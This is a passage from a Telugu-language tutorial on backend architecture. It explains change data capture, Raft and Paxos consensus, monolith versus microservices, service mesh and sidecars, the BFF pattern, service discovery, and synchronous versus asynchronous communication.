2. **CDC (Modern Way):** PostgreSQL లేదా MySQL లాంటి డేటాబేస్ లు ప్రతి మార్పుని లోపల ఒక సీక్రెట్ డైరీలో రాసుకుంటాయి, దాన్నే **WAL (Write-Ahead Log)** లేదా **Binlog** అంటారు. CDC టూల్స్ (ఉదాహరణకు **Debezium**) నేరుగా ఈ లాగ్ ఫైల్ ని చదువుతాయి. డేటాబేస్ క్వెరీ రన్ చేయాల్సిన అవసరం లేదు. డేటాబేస్ లో ఒక రో మారిన మరుసటి మిల్లీసెకండ్‌లో ఆ ఈవెంట్ కాఫ్కా లోకి వెళ్ళిపోతుంది.

- **Real-World Use:** మీ ఆర్డర్ టేబుల్ లో మార్పు జరగగానే, CDC ద్వారా ఆ డేటా వెంటనే **Elasticsearch** కి సింక్ అవుతుంది, తద్వారా యూజర్ కి వెబ్‌సైట్ లో కొత్త ప్రొడక్ట్స్ వెంటనే సెర్చ్ లో కనిపిస్తాయి.

---

## 2. Leader Election & Consensus (లీడర్ ఎన్నిక మరియు ఏకాభిప్రాయం)

ఒక డిస్ట్రిబ్యూటెడ్ క్లస్టర్ లో 5 సర్వర్లు ఉన్నాయి అనుకుందాం. అందరూ సమానంగా రూల్స్ రాస్తే గందరగోళం (Conflict) అవుతుంది. అందుకే సిస్టమ్ సక్రమంగా నడవడానికి ఒక **Leader** కావాలి. మిగతా వాళ్ళు **Followers** లాగా ఉంటారు. రైట్ ఆపరేషన్స్ (Writes) అన్నీ లీడర్ ద్వారానే జరగాలి.

- **Leader Election:** ఒకవేళ ఉన్న లీడర్ సర్వర్ క్రాష్ అయితే, మిగతా ఫాలోవర్ సర్వర్లు కలిసి చర్చించుకుని, తమలో ఒకరిని కొత్త లీడర్ గా ఎన్నుకునే ప్రక్రియ.
- **Consensus (ఏకాభిప్రాయం):** "సిస్టమ్ లో ప్రస్తుతం డేటా స్టేట్ ఏంటి?" లేదా "కొత్త లీడర్ ఎవరు?" అనే విషయంపై క్లస్టర్ లోని మెజారిటీ సర్వర్లు ఒకే నిర్ణయానికి రావడం. నెట్‌వర్క్ సమస్యలు ఉన్నా కూడా అందరూ ఒకే మాటపై నిలబడటమే కాన్సెన్సస్.

---

## 3. Consensus Protocols (The Brains of Distributed Systems)

డిస్ట్రిబ్యూటెడ్ సిస్టమ్స్ లో ఏకాభిప్రాయం సాధించడానికి మరియు లీడర్ ని ఎన్నుకోవడానికి వాడే రెండు అత్యంత ప్రసిద్ధ అల్గారిథమ్స్ ఇవి:

### 🏛️ Paxos (The Pioneer)

- **What it is:** ఇది డిస్ట్రిబ్యూటెడ్ సిస్టమ్స్ చరిత్రలో మొట్టమొదటి మరియు అత్యంత పాత కాన్సెన్సస్ ప్రోటోకాల్. దీన్ని లెస్లీ లాంపోర్ట్ (Leslie Lamport) డిజైన్ చేశారు.
- **How it works:** ఇందులో సర్వర్లు Proposers, Acceptors, Learner అనే రోల్స్ లో ఉండి, మల్టిపుల్ రౌండ్స్ మెసేజ్ లు పంపుకుంటూ ఒక వాల్యూ ని డిసైడ్ చేస్తాయి.
- **The Catch:** పాక్సోస్ మ్యాథమేటికల్ గా పర్ఫెక్ట్, కానీ దీన్ని అర్థం చేసుకోవడం మరియు కోడ్ రూపంలో రాయడం (Implementation) ప్రపంచంలోనే అత్యంత కష్టమైన పని. ఇంటర్వ్యూలలో కూడా దీన్ని ఒక పీడకల లాగా చూస్తారు. అందుకే దీనికి ఒక సులభమైన అప్‌గ్రేడ్ వచ్చింది.

### Raft (The Elegant Upgrade)

- **What it is:** పాక్సోస్ చాలా కాంప్లెక్స్ గా ఉందని, డెవలపర్లకి సులభంగా అర్థమయ్యేలా మరియు సులువుగా ఇంప్లిమెంట్ చేసేలా 2014 లో డిజైన్ చేయబడిన మోడర్న్ ప్రోటోకాల్. ప్రస్తుతం **etcd**, **Consul**, మరియు **Kafka (KRaft)** లు దీని పైనే నడుస్తున్నాయి.
- **How Raft Works (3 States):**
  Raft లో ప్రతి సర్వర్ మూడు స్టేట్స్ లో ఒకదానిలో ఉంటుంది: **Follower**, **Candidate**, లేదా **Leader**.

1. **Heartbeats:** లీడర్ సర్వర్ ప్రతి కొన్ని మిల్లీసెకన్లకి మిగతా ఫాలోవర్లకి "నేను బతికే ఉన్నాను" అని ఒక సిగ్నల్ (Heartbeat) పంపుతూ ఉంటుంది.
2. **Leader Election:** ఒకవేళ లీడర్ నుండి హార్ట్‌బీట్ రావడం ఆగిపోతే (లీడర్ డౌన్ అయితే), ఫాలోవర్స్ తమ వెయిటింగ్ టైమర్ (**Election Timeout**) ముగియగానే **Candidate** గా మారుతాయి. ఆ క్యాండిడేట్ మిగతా సర్వర్లకి "నాకు ఓటు వేయండి" అని అడుగుతుంది. మెజారిటీ ఓట్లు (Quorum - ఉదాహరణకు 5 లో 3 ఓట్లు) వచ్చిన సర్వర్ కొత్త **Leader** అవుతుంది.
3. **Log Replication:** కొత్త డేటా ఏదైనా వస్తే లీడర్ దాన్ని తన డైరీలో రాసుకుని, ఫాలోవర్లకి పంపుతుంది. మెజారిటీ ఫాలోవర్లు "మేము కూడా రాసుకున్నాం" అని కన్ఫర్మ్ చేసాకే లీడర్ ఆ డేటాని ఫైనల్ (Commit) చేస్తుంది.

---

# 8: Microservices

బ్యాకెండ్ ఆర్కిటెక్చర్‌లో అత్యంత ప్రాథమికమైన మరియు ఎప్పటికీ నడిచే పెద్ద చర్చ ఇది: **Monolith vs Microservices**. మనం సాఫ్ట్‌వేర్ బిల్డ్ చేసేటప్పుడు అప్లికేషన్ స్ట్రక్చర్‌ని ఎలా డిజైన్ చేయాలి అని చెప్పే రెండు విభిన్నమైన పద్ధతులు ఇవి.

దీన్ని కూడా మన స్టైల్‌లో—అసలు ఇవి ఏంటి, మోనోలిత్ నుండి మైక్రోసర్వీసెస్ కి ప్రపంచం ఎందుకు షిఫ్ట్ అయింది, మరియు మైక్రోసర్వీసెస్ కి వెళ్ళినప్పుడు వచ్చే కొత్త తలనొప్పులు ఏంటి అనేది తెలుగులో క్లియర్‌గా చూద్దాం.

---

## 1. Monolith Architecture (అంతా ఒకే చోట)

- **What it is:** మీ అప్లికేషన్ యొక్క మొత్తం కోడ్ (Auth, Payment, Orders, Notifications) అంతా కలిపి ఒకే ఒక్క పెద్ద ప్రాజెక్ట్‌గా, ఒకే కోడ్‌బేస్ (Single Repository) లో ఉండటాన్ని **Monolith** అంటారు. ఇది రన్ అయినప్పుడు ఒకే ఒక ప్రొసెస్ లాగా సర్వర్‌లో రన్ అవుతుంది మరియు ఒకే ఒక పెద్ద డేటాబేస్‌ని వాడుకుంటుంది.
- **Analogy (ఉదాహరణ):** ఒక పెద్ద సూపర్ మార్కెట్ లాంటిది. ఒకే బిల్డింగ్ లోపల కిరాణా సామాన్లు, బట్టలు, ఎలక్ట్రానిక్స్ అన్నీ ఉంటాయి. మేనేజర్ ఒక్కడే, క్యాష్ కౌంటర్ ఒక్కటే.

### 👍 లాభాలు:

- **Simple to Build & Deploy:** స్టార్టింగ్ లో అప్లికేషన్ డెవలప్ చేయడం చాలా ఈజీ. ఒకే ఒక ఫైల్‌ని సర్వర్‌లో వేస్తే డెప్లాయ్‌మెంట్ అయిపోతుంది.
- **Fast Inter-service Calls:** కోడ్ అంతా ఒకే మెమరీలో ఉంటుంది కాబట్టి, ఆర్డర్ ఫంక్షన్ నుండి పేమెంట్ ఫంక్షన్‌ని నేరుగా (In-memory function call) పిలవచ్చు. నెట్‌వర్క్ లాగ్స్ ఉండవు.
- **Easy Transactions:** ఒకే డేటాబేస్ ఉంటుంది కాబట్టి ACID రూల్స్ పక్కాగా పనిచేస్తాయి.

### 👎 నష్టాలు (Why we upgraded):

- **Scaling Nightmare:** మీ యాప్‌లో కేవలం 'Payment' సర్వీస్ పై మాత్రమే లోడ్ ఎక్కువ ఉందనుకుందాం. మీరు దాన్ని మాత్రమే విడిగా స్కేల్ చేయలేరు. మొత్తం పెద్ద మోనోలిత్ యాప్‌ని ఇంకో సర్వర్‌లో రన్ చేయాల్సి వస్తుంది (Waste of resources).
- **Single Point of Failure (SPOF):** ఒక డెవలపర్ రాసిన కోడ్‌లో చిన్న బగ్ వల్ల మెమరీ లీక్ అయితే, మొత్తం సర్వర్ క్రాష్ అవుతుంది. అంటే పేమెంట్‌లో బగ్ వస్తే, సంబంధం లేని లాగిన్ సర్వీస్ కూడా ఆగిపోతుంది.
- **Tech Stack Lock-in:** మొత్తం యాప్‌ని ఒకే లాంగ్వేజ్ (ఉదా: Node.js లేదా Java) లో రాయాలి. ఒక సర్వీస్ కోసం పైథాన్ వాడదాం అంటే కుదరదు.

---

## 2. Microservices Architecture (ముక్కలు ముక్కలుగా విడగొట్టడం)

- **What it is:** ఒకే పెద్ద యాప్ ని వాడే బదులు, దాన్ని చిన్న చిన్న, స్వతంత్రమైన సర్వీసెస్ (Small, Independent Services) గా విడగొట్టడం. ప్రతీ సర్వీస్ కి విడివిడిగా కోడ్‌బేస్ ఉంటుంది, విడిగా సర్వర్‌లో రన్ అవుతాయి, మరియు ప్రతీ దానికి విడివిడిగా **స్వంతంత్రీయ డేటాబేస్ (Database-per-service)** ఉంటుంది. ఇవి ఒకదానితో ఒకటి HTTP/REST, gRPC లేదా Kafka ద్వారా మాట్లాడుకుంటాయి.
- **Analogy (ఉదాహరణ):** ఒక పెద్ద షాపింగ్ మాల్ లాంటిది. బట్టలకి ఒక విడిగా బ్రాండెడ్ షోరూమ్, ఫుడ్ కోర్ట్ కి విడిగా హోటల్స్ ఉంటాయి. ఒక హోటల్ క్లోజ్ అయినా, బట్టల షాప్ నడుస్తూనే ఉంటుంది. ప్రతీ దానికి విడివిడి బిల్లింగ్ కౌంటర్లు ఉంటాయి.

```text
  [ Client / UI ]
         │
         ▼
  [ API Gateway ]
         │
 ┌───────┼───────┐ (gRPC / HTTP)
 ▼       ▼       ▼
[Auth] [Order] [Payment]  <─── Microservices
  │       │       │
  ▼       ▼       ▼
[DB-1]  [DB-2]  [DB-3]    <─── Database-per-service

```

### 👍 లాభాలు (The Massive Upgrade):

- **Independent Scaling:** ఏ సర్వీస్‌కి ట్రాఫిక్ ఎక్కువ ఉంటే, దాన్ని మాత్రమే హారిజాంటల్ గా 10 సర్వర్లలో స్కేల్ చేయవచ్చు. మిగతా సర్వీసెస్ ని తాకాల్సిన అవసరం లేదు.
- **Fault Isolation (సురక్షితం):** పేమెంట్ సర్వీస్ క్రాష్ అయినా, యూజర్లు ఇంకా ప్రొడక్ట్స్ ని బ్రౌజ్ చేయగలరు, కార్ట్ కి యాడ్ చేయగలరు. సిస్టమ్ మొత్తం ఒకేసారి పడిపోదు.
- **Polyglot Architecture:** లాజిక్ ని బట్టి కరెక్ట్ లాంగ్వేజ్ ఎంచుకోవచ్చు. ఆర్డర్స్ కి Node.js, AI/Analytics కి Python, పేమెంట్స్ కి Java వాడుకోవచ్చు.

### 👎 ద క్యాచ్ (The New Set of Problems):

మైక్రోసర్వీసెస్ చాలా బాగుంటుంది, కానీ ఇది ఉచితంగా రాదు. దీనితో పాటు మనం ఈ రోడ్‌మ్యాప్‌లో నేర్చుకున్న వంద కొత్త తలనొప్పులు (Complexities) వస్తాయి:

- **Distributed Transactions:** మనం చూసిన **Saga Pattern** లేదా Outbox Pattern వాడాల్సి వస్తుంది. డేటా కన్సిస్టెన్సీ మెయింటెన్ చేయడం చాలా కష్టం.
- **Network Latency:** ఫంక్షన్ కాల్స్ స్థానంలో నెట్‌వర్క్ కాల్స్ (HTTP/gRPC) వస్తాయి కాబట్టి, సిస్టమ్ కొంచెం స్లో అయ్యే ఛాన్స్ ఉంది.
- **Operational Overhead:** 1 సర్వర్‌ని చూసుకోవడానికి బదులు, ఇప్పుడు 20 సర్వీసెస్, లోడ్ బాలెన్సర్లు, **Service Discovery**, కంటైనర్లు (Docker/Kubernetes) మేనేజ్ చేయాలి.

---

## 💡 ద గోల్డెన్ రూల్ (ఎప్పుడు ఏది వాడాలి?)

ఇంటర్వ్యూలలో లేదా రియల్ లైఫ్ లో డెవలపర్లు చేసే అతిపెద్ద తప్పు—స్టార్టింగ్ లోనే మైక్రోసర్వీసెస్ తో మొదలుపెట్టడం.

> ✨ **"Don’t start with Microservices. Start with a Monolith, build it cleanly, and split it into Microservices when it gains scale and complexity."**

- **Choose Monolith if:** మీరు ఒక కొత్త స్టార్టప్ లేదా MVP (Minimum Viable Product) బిల్డ్ చేస్తున్నారు, మీ టీమ్ చిన్నది, మరియు మీ బిజినెస్ లాజిక్ ఇంకా స్థిరంగా మారలేదు.
- **Choose Microservices if:** మీ అప్లికేషన్ చాలా పెద్దదైపోయింది, వందల మంది డెవలపర్లు వేర్వేరు టీమ్స్ గా వర్క్ చేస్తున్నారు, మరియు సిస్టమ్‌లోని కొన్ని భాగాలకి విపరీతమైన స్కేలింగ్ అవసరం అవుతోంది.

---

మైక్రోసర్వీసెస్ (Microservices) ఆర్కిటెక్చర్‌లో సర్వీసెస్ సంఖ్య పెరిగేకొద్దీ, నెట్‌వర్క్ ట్రాఫిక్‌ని మేనేజ్ చేయడం మరియు సెక్యూర్ చేయడం ఒక పెద్ద సవాలుగా మారుతుంది. ఇక్కడే మనకు రెండు రకాల ట్రాఫిక్స్ ఎదురవుతాయి:

1. **North-South Traffic:** క్లయింట్ (మొబైల్/వెబ్) నుండి మన సర్వర్ల లోపలికి వచ్చే ట్రాఫిక్.
2. **East-West Traffic:** మన సర్వర్ల లోపల ఒక మైక్రోసర్వీస్ నుండి ఇంకో మైక్రోసర్వీస్‌కి మధ్య జరిగే ఇంటర్నల్ కమ్యూనికేషన్.

ఈ ట్రాఫిక్స్‌ని కంట్రోల్ చేయడానికి వాడే అత్యంత ముఖ్యమైన ఆర్కిటెక్చరల్ ప్యాటర్న్స్ మరియు టూల్స్ ఇవి. వీటిని కూడా తెలుగులో క్లియర్‌గా చూద్దాం.

---

## 1. API Gateway vs Service Mesh (ట్రాఫిక్ కంట్రోలర్స్)

చాలా మంది ఈ రెండింటి మధ్య కన్ఫ్యూజ్ అవుతుంటారు. కానీ ఇవి రెండు వేర్వేరు సమస్యలను సాల్వ్ చేస్తాయి.

### 🔀 API Gateway (North-South Traffic Manager)

- **What it is:** ఇది వెలుపలి ప్రపంచానికి (Clients), మన ఇంటర్నల్ మైక్రోసర్వీసెస్ కి మధ్య ఉండే ఒక సింగిల్ ఎంట్రీ పాయింట్ (ఉదా: AWS API Gateway, Kong, Apisix).
- **Role:** బయట నుండి వచ్చే రిక్వెస్ట్‌లను అథెంటికేట్ చేయడం (JWT Check), రేట్ లిమిటింగ్ (Rate Limiting) వేయడం, మరియు కరెక్ట్ సర్వీస్‌కి రూట్ చేయడం దీని పని. ఇది **North-South** ట్రాఫిక్‌ని కంట్రోల్ చేస్తుంది.

### 🕸️ Service Mesh (East-West Traffic Manager)

- **What it is:** లోపలికి వచ్చిన రిక్వెస్ట్, ఇంటర్నల్ గా వందల సర్వీసెస్ మధ్య తిరుగుతున్నప్పుడు (**East-West**), ఆ కమ్యూనికేషన్‌ని మేనేజ్ చేసే ఒక అంకితమైన ఇన్‌ఫ్రాస్ట్రక్చర్ లేయర్ (ఉదా: Istio, Linkerd).
- **Why we upgraded:** మైక్రోసర్వీసెస్ మధ్య కనెక్షన్ సెక్యూర్ గా ఉండాలి (mTLS), సర్క్యూట్ బ్రేకర్లు ఉండాలి, మరియు లాగ్స్ కలెక్ట్ అవ్వాలి. ప్రతీ సర్వీస్ కోడ్ లోపలా (Node.js/Java లో) ఈ లాజిక్ ని రాయడం కష్టం. అందుకే కోడ్‌తో సంబంధం లేకుండా నెట్‌వర్కింగ్ బాధ్యతల్ని `Service Mesh` చూసుకుంటుంది.

---

## 2. Sidecar Pattern (పక్కనే ఉండే అసిస్టెంట్)

- **What it is:** ఒక మోటార్ సైకిల్‌కి పక్కన ఒక సైడ్‌కార్ (Sidecar) అటాచ్ చేసినట్లు, మీ మెయిన్ అప్లికేషన్ కంటైనర్ (ఉదా: మీ Node.js యాప్) పక్కనే, దానికి సపోర్ట్ ఇవ్వడానికి ఇంకో చిన్న హెల్పర్ కంటైనర్‌ని రన్ చేసే డిజైన్ ప్యాటర్న్.
- **How it works:** మీ మెయిన్ యాప్ కి తెలియకుండా నెట్‌వర్కింగ్, సెక్యూరిటీ, లాగింగ్ వంటి పనులన్నీ ఈ సైడ్‌కార్ చూసుకుంటుంది.

> 💡 **The Connection:** **Service Mesh** అనేది ఈ సైడ్‌కార్ ప్యాటర్న్ పైనే పనిచేస్తుంది! ఇస్టియో (Istio) లాంటి సర్వీస్ మెష్, మీ ప్రతీ మైక్రోసర్వీస్ పక్కన **Envoy Proxy** అనే ఒక సైడ్‌కార్ ని పెడుతుంది. సర్వీస్-A నుండి సర్వీస్-B కి వెళ్ళే ప్రతి రిక్వెస్ట్ ఈ సైడ్‌కార్ల ద్వారానే ఎన్‌క్రిప్ట్ (mTLS) అయి వెళ్తుంది. మీ అప్లికేషన్ కోడ్ కి ఈ విషయమే తెలియదు.

---

## 3. BFF (Backend For Frontend)

- **The Problem:** ఒకే మైక్రోసర్వీసెస్ బ్యాకెండ్ ని డెస్క్‌టాప్ వెబ్‌సైట్, మొబైల్ యాప్, మరియు స్మార్ట్ వాచ్ యాప్ వాడుతున్నాయి అనుకుందాం.
- డెస్క్‌టాప్ స్క్రీన్ పెద్దది కాబట్టి దానికి ఒకేసారి యూజర్ ప్రొఫైల్, ఆర్డర్స్, రివ్యూస్ అన్నీ (భారీ JSON డేటా) కావాలి.
- మొబైల్ లేదా స్మార్ట్ వాచ్ స్క్రీన్ చిన్నది, ఇంటర్నెట్ స్లోగా ఉండొచ్చు. దానికి అంత డేటా వద్దు, కేవలం సింపుల్ ఇన్ఫో మాత్రమే కావాలి.

ఒకే API గేట్‌వే నుండి అందరికీ ఒకే రకమైన డేటా పంపితే మొబైల్ యాప్స్ స్లో అయిపోతాయి (Over-fetching).

```text
                     ┌──────────────────┐
                     │   Client Layer   │
                     └─┬──────────────┬─┘
                       │              │
        (Mobile Request)              (Web Request)
                       ▼              ▼
                 ┌──────────┐   ┌──────────┐
                 │ Mobile   │   │ Web      │  <─── BFF Layer
                 │ BFF      │   │ BFF      │
                 └────┬─────┘   └─────┬────┘
                      │               │
                      └───────┬───────┘
                              ▼
                   ┌─────────────────────┐
                   │ Internal Services   │
                   │ [Auth] [Order] [DB] │
                   └─────────────────────┘

```

- **The Solution (BFF):** ప్రతీ రకమైన ఫ్రంటెండ్ కి విడివిడిగా ఒక చిన్న బ్యాకెండ్ లేయర్ ని డిజైన్ చేయడమే **BFF ప్యాటర్న్**.
- **Mobile BFF:** మొబైల్ యాప్ కోసం డేటాని కంప్రెస్ చేసి, కేవలం కావలసిన ఫీల్డ్స్ మాత్రమే ఇస్తుంది.
- **Web BFF:** వెబ్‌సైట్ కి కావలసిన భారీ డేటాని మల్టిపుల్ సర్వీసెస్ నుండి అగ్రిగేట్ చేసి ఇస్తుంది.

- **Why it's amazing:** ఫ్రంటెండ్ డెవలపర్లకి తమ స్క్రీన్ అవసరాలకు తగ్గట్టుగా బ్యాకెండ్ APIలను మోల్డ్ చేసుకునే స్వేచ్ఛ దొరుకుతుంది.

---

మైక్రోసర్వీసెస్ (Microservices) నెట్‌వర్క్‌లో వందలాది సర్వర్లు డైనమిక్‌గా ఆటో-స్కేల్ (Autoscale) అవుతుంటాయి, అంటే క్షణంలో కొత్త సర్వర్లు రావచ్చు, పాతవి క్లోజ్ అవ్వచ్చు. ఇలాంటి వాతావరణంలో సర్వీసెస్ ఒకదాని అడ్రస్ (IP Address) ఒకటి ఎలా కనుక్కుంటాయి మరియు వాటి మధ్య కమ్యూనికేషన్ ఎలా జరుగుతుంది అనేది ఈ టాపిక్స్ వివరిస్తాయి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Service Registry & Discovery (చిరునామా వెతకడం)

మైక్రోసర్వీసెస్ లో హార్డ్‌కోడెడ్ ఐపీ అడ్రస్‌లు (`http://192.168.1.50:3000`) వాడటం అసాధ్యం. దానికి ప్రత్యామ్నాయంగా ఈ ఆర్కిటెక్చర్ వాడుతాం:

### 📔 Service Registry

- **What it is:** ఇది మైక్రోసర్వీసెస్ క్లస్టర్ యొక్క **గ్లోబల్ ఫోన్ బుక్** లేదా డేటాబేస్ (ఉదా: Consul, Netflix Eureka, etcd).
- **How it works:** `Payment-Service` లేదా `Order-Service` కి సంబంధించిన ఏ కొత్త ఇన్స్టాన్స్ (సర్వర్) స్టార్ట్ అయినా, అది వెంటనే ఈ రిజిస్ట్రీ కి కనెక్ట్ అయి, "నా పేరు _Payment-Service_, నా కరెంట్ ఐపీ _10.0.0.5:8080_" అని రిజిస్టర్ చేసుకుంటుంది. అలాగే అది బతికే ఉందో లేదో చెప్పడానికి నిరంతరం హార్ట్‌బీట్స్ (Heartbeats) పంపుతుంది. సర్వర్ ఆగిపోతే రిజిస్ట్రీ దాని పేరును డిలీట్ చేస్తుంది.

### 🔍 Discovery Models (కనుగొనే పద్ధతులు)

ఒక సర్వీస్ ఇంకో సర్వీస్ ఐపీని ఎలా తెచ్చుకుంటుంది అనేదానిలో రెండు రకాలు ఉన్నాయి:

1. **Client-Side Discovery:**

- ఇక్కడ క్లయింట్ (ఉదా: `Order-Service`) స్వయంగా _Service Registry_ ని అడిగి `Payment-Service` కి ఉన్న అన్ని లైవ్ ఐపీల లిస్ట్‌ను తెచ్చుకుంటుంది. ఆ లిస్ట్ నుండి తన దగ్గర ఉన్న క్లయింట్-సైడ్ లోడ్ బాలెన్సర్ (ఉదా: Netflix Ribbon) ద్వారా ఒక ఐపీని ఎంచుకుని డైరెక్ట్‌గా కాల్ చేస్తుంది.
- _Pros:_ మధ్యలో లోడ్ బాలెన్సర్ అనే ఒక అదనపు సర్వర్ నెట్‌వర్క్ హాప్ (Hop) తగ్గడం వల్ల ఇది ఫాస్ట్.

2. **Server-Side Discovery (Most Common - Kubernetes Way):**

- ఇక్కడ క్లయింట్ నేరుగా రిజిస్ట్రీని అడగదు. క్లయింట్ ఒక స్థిరమైన రౌటర్ లేదా లోడ్ బాలెన్సర్‌ని కాల్ చేస్తుంది. ఆ లోడ్ బాలెన్సర్ అంతర్గతంగా _Service Registry_ ని చెక్ చేసి, రిక్వెస్ట్‌ని వెనుక ఉన్న ఖాళీ సర్వర్‌కి మళ్లిస్తుంది. AWS ALB లేదా Kubernetes Services ఈ మోడల్‌లోనే పనిచేస్తాయి.
- _Pros:_ క్లయింట్ కోడ్‌లో ఎలాంటి డిస్కవరీ లాజిక్ రాయాల్సిన అవసరం లేదు.

---

## 2. Communication Patterns (సర్వీసెస్ ఎలా మాట్లాడుకుంటాయి?)

మైక్రోసర్వీసెస్ ఒకదానితో ఒకటి డేటా షేర్ చేసుకోవడానికి ప్రధానంగా రెండు కమ్యూనికేషన్ పద్ధతులను వాడుతాయి:

### 📞 Synchronous Pattern (వెంటనే సమాధానం కావాలి)

- **What it is:** ఒక సర్వీస్ ఇంకో సర్వీస్‌ని కాల్ చేసి, అవతలి సర్వర్ నుండి రెస్పాన్స్ వచ్చే వరకు తన పనిని ఆపి (Block చేసి) వెయిట్ చేయడాన్ని **Synchronous** కమ్యూనికేషన్ అంటారు.
- **Protocols Used:**
- **HTTP/REST:** సింపుల్, హ్యూమన్-రీడబుల్ JSON డేటాని పంపడానికి.
- **gRPC:** ప్రొటోకాల్ బఫర్స్ (Protobuf) వాడి బైనరీ రూపంలో అత్యంత వేగంగా, తక్కువ నెట్‌వర్క్ లాటెన్సీతో మాట్లాడుకోవడానికి.

- **Real-World Example:** యూజర్ లాగిన్ అవుతున్నప్పుడు `Auth-Service` కచ్చితంగా డేటాబేస్ లేదా యూజర్ సర్వీస్ నుండి "పాస్‌వర్డ్ కరెక్టా కాదా" అని వెంటనే సమాధానం తెచ్చుకోవాలి. వెయిట్ చేయక తప్పదు.
- **The Risk:** అవతలి సర్వీస్ డౌన్ అయితే మీ సర్వీస్ కూడా బ్లాక్ అయి క్రాష్ అయ్యే ప్రమాదం ఉంది (దీనికే మనం _Circuit Breaker_ వాడతాం).

### ✉️ Asynchronous Pattern (పని చెప్పేసి వెళ్ళిపోవడం)

- **What it is:** ఒక సర్వీస్ ఇంకో సర్వీస్‌కి ఒక పనిని అప్పజెప్పి (Event/Message పంపి), రెస్పాన్స్ కోసం వెయిట్ చేయకుండా తన తదుపరి పనిని చూసుకోవడాన్ని **Asynchronous** కమ్యూనికేషన్ అంటారు. ఇది పూర్తిగా **Non-blocking**.
- **Tools Used:** Message Brokers (Apache Kafka, RabbitMQ, Amazon SQS).
- **Real-World Example:** యూజర్ ఆర్డర్ ప్లేస్ చేయగానే, `Order-Service` డేటాబేస్ లో సేవ్ చేసి "Order Placed Successfully" అని యూజర్‌కి స్క్రీన్ పై చూపించేస్తుంది. బ్యాక్‌గ్రౌండ్‌లో `Order-Created` అనే ఒక ఈవెంట్‌ని కాఫ్కా లోకి తోసేస్తుంది. ఆ ఈవెంట్‌ని చూసి `Notification-Service` ఈమెయిల్ పంపుతుంది, `Inventory-Service` స్టాక్ తగ్గిస్తుంది. ఆర్డర్ సర్వీస్ వీటి కోసం వెయిట్ చేయదు.
- **Why it's a massive upgrade:** సర్వీసెస్ ఒకదానిపై ఒకటి ఆధారపడవు (**Loose Coupling**). నోటిఫికేషన్ సర్వర్ డౌన్ అయినా ఆర్డర్లు ఆగవు. అది మళ్ళీ ఆన్‌లైన్ లోకి వచ్చాక క్యూ లోని పాత మెసేజ్‌లను చదువుకుంటుంది.

---

మైక్రోసర్వీసెస్ (Microservices) మరియు డిస్ట్రిబ్యూటెడ్ సిస్టమ్స్ ఆర్కిటెక్చర్‌లో సర్వీసెస్ ఒకదానితో ఒకటి ఎలా కమ్యూనికేట్ అవ్వాలి మరియు ఒక పెద్ద బిజినెస్ ప్రాసెస్ ని (ఉదాహరణకు: ఆర్డర్ పెట్టినప్పటి నుండి డెలివరీ అయ్యే వరకు) ఎలా నడిపించాలి అని డిసైడ్ చేసే కోర్ ఆర్కిటెక్చరల్ డిజైన్స్ ఇవి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో కంపేర్ చేస్తూ నేర్చుకుందాం.

---

## 1. Sync vs Async (కమ్యూనికేషన్ శైలి)

సర్వీసెస్ మధ్య డేటా బదిలీ ఎలా జరుగుతుంది అనేదానిపై ఈ తేడా ఉంటుంది:

| ఫీచర్                   | Synchronous (సింక్రోనస్)                                                                                                     | Asynchronous (అసింక్రోనస్)                                                                                                                   |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| **పనితీరు**             | **Request-Response:** ఒక సర్వీస్ రిక్వెస్ట్ పంపి, అవతలి సర్వీస్ నుండి రెస్పాన్స్ వచ్చే వరకు వెయిట్ చేస్తుంది (**Blocking**). | **Event-Driven:** ఒక సర్వీస్ మెసేజ్/ఈవెంట్‌ని క్యూ లో వేసి, రెస్పాన్స్ కోసం వెయిట్ చేయకుండా తన నెక్స్ట్ పని చూసుకుంటుంది (**Non-blocking**). |
| **టూల్స్/ప్రోటోకాల్స్** | HTTP/REST, gRPC                                                                                                              | Apache Kafka, RabbitMQ, Amazon SQS                                                                                                           |
| **కపులింగ్ (Coupling)** | **Tight Coupling:** అవతలి సర్వీస్ రన్ అవుతూ ఉంటేనే ఈ సర్వీస్ పని చేస్తుంది.                                                  | **Loose Coupling:** అవతలి సర్వీస్ తాత్కాలికంగా డౌన్ అయినా ఈ సర్వీస్ కి ఏ ఇబ్బంది ఉండదు.                                                      |
| **ఉదాహరణ**              | **ATM పిన్ వెరిఫికేషన్:** మీరు పిన్ కొట్టాక బ్యాంక్ సర్వర్ "పిన్ కరెక్ట్" అని చెప్పే వరకు స్క్రీన్ వెయిట్ చేయాలి.            | **ఈమెయిల్ నోటిఫికేషన్:** ఆర్డర్ కన్ఫర్మ్ అయ్యాక ఈమెయిల్ వెళ్ళడానికి 2 సెకన్లు లేట్ అయినా పర్లేదు, బ్యాక్‌గ్రౌండ్‌లో జరిగిపోతుంది.            |

---

## 2. Choreography vs Orchestration (ప్రాసెస్ మేనేజ్‌మెంట్)

ఒక పెద్ద వర్క్‌ఫ్లో (Workflow) లో మల్టిపుల్ మైక్రోసర్వీసెస్ ఇన్వాల్వ్ అయినప్పుడు, ఆ సిస్టమ్‌ని ఎలా నడపాలనే దానిపై ఈ రెండు డిజైన్ ప్యాటర్న్స్ (ముఖ్యంగా **Saga Pattern** లో) వాడుతాం.

### 🕺 Choreography (డ్యాన్స్ లాంటిది - No Leader)

- **Concept:** ఒక క్లాసికల్ గ్రూప్ డ్యాన్స్‌లో ప్రతి డ్యాన్సర్ పక్క వాళ్ళ మూమెంట్స్ ని చూసి తమ స్టెప్స్ ఎలా వేస్తారో, ఇక్కడ కూడా అంతే. ఏ ఒక్క సెంట్రల్ లీడర్ లేదా మేనేజర్ ఉండడు.
- **How it works:** ఇది పూర్తిగా **Async (Event-Driven)** పై నడుస్తుంది. ప్రతి సర్వీస్ తన పని అవ్వగానే ఒక ఈవెంట్‌ని కాఫ్కా లోకి వదులుతుంది. ఆ ఈవెంట్‌ని వింటున్న (Subscribe చేసిన) ఇంకో సర్వీస్ అలర్ట్ అయి తన పని మొదలుపెడుతుంది.
- _ఫ్లో:_ `Order Service` ఆర్డర్ సేవ్ చేసి `Order-Created` ఈవెంట్ పంపుతుంది ──► ఆ ఈవెంట్ చూసి `Payment Service` మనీ కట్ చేసి `Payment-Success` ఈవెంట్ పంపుతుంది ──► అది చూసి `Inventory Service` స్టాక్ తగ్గిస్తుంది.

